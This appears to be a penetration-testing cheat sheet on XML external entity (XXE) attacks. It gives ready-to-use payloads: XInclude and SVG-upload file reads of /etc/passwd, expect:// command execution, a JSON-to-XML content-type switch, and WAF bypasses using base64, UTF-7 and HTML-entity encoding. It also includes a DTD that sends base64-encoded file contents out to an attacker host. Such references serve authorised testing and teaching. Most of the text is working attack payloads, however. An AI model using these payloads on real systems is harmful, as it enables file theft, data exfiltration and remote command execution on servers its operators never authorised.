# XXE - Hidden Surfaces, WAF Bypasses, and PHP Wrappers

## Hidden XXE Surfaces

### XInclude

When integrating client data into server-side XML documents, like those in backend SOAP requests, direct control over the XML structure is often limited, hindering traditional XXE attacks due to restrictions on modifying the `DOCTYPE` element. However, an `XInclude` attack provides a solution by allowing the insertion of external entities within any data element of the XML document. This method is effective even when only a portion of the data within a server-generated XML document can be controlled.

To execute an `XInclude` attack, the `XInclude` namespace must be declared, and the file path for the intended external entity must be specified. Below is a succinct example of how such an attack can be formulated:

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

### SVG - File Upload

Files uploaded by users to certain applications, which are then processed on the server, can exploit vulnerabilities in how XML or XML-containing file formats are handled. Common file formats like office documents (DOCX) and images (SVG) are based on XML.

When users **upload images**, these images are processed or validated server-side. Even for applications expecting formats such as PNG or JPEG, the **server's image processing library might also support SVG images**. SVG, being an XML-based format, can be exploited by attackers to submit malicious SVG images, thereby exposing the server to XXE (XML External Entity) vulnerabilities.

An example of such an exploit is shown below, where a malicious SVG image attempts to read system files:

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```

Another method involves attempting to **execute commands** through the PHP "expect" wrapper:

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

In both instances, the SVG format is used to launch attacks that exploit the XML processing capabilities of the server's software, highlighting the need for robust input validation and security measures.

Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

**Note the first line of the read file or of the result of the execution will appear INSIDE the created image. So you need to be able to access the image SVG has created.**

### **PDF - File upload**

Read the following post to **learn how to exploit a XXE uploading a PDF** file:

### Content-Type: From x-www-urlencoded to XML

If a POST request accepts the data in XML format, you could try to exploit a XXE in that request. For example, if a normal request contains the following:

```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Then you might be able submit the following request, with the same result:

```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

### Content-Type: From JSON to XEE

To change the request you could use a Burp Extension named “**Content Type Converter**“. [Here](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) you can find this example:

```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```

Another example can be found [here](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Protections Bypasses

### Base64

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

This only work if the XML server accepts the `data://` protocol.

### UTF-7

You can use the \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/index.html#recipe=Encode_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/index.html#recipe=Encode_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transform to UTF-7.

```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

### File:/ Protocol Bypass

If the web is using PHP, instead of using `file:/` you can use **php wrappers**`php://filter/convert.base64-encode/resource=` to **access internal files**.

If the web is using Java you may check the [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Trick from [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
You can create an **entity inside an entity** encoding it with **html entities** and then call it to **load a dtd**.\
Note that the **HTML Entities** used needs to be **numeric** (like \[in this example]\([https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](<https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C>)).

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "<&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
    <env>&exfil;</env>
</data>
```

DTD example:

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```

## PHP Wrappers

### Base64

**Extract** _**index.php**_

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

#### **Extract external resource**

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```

### Remote code execution

**If PHP "expect" module is loaded**

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
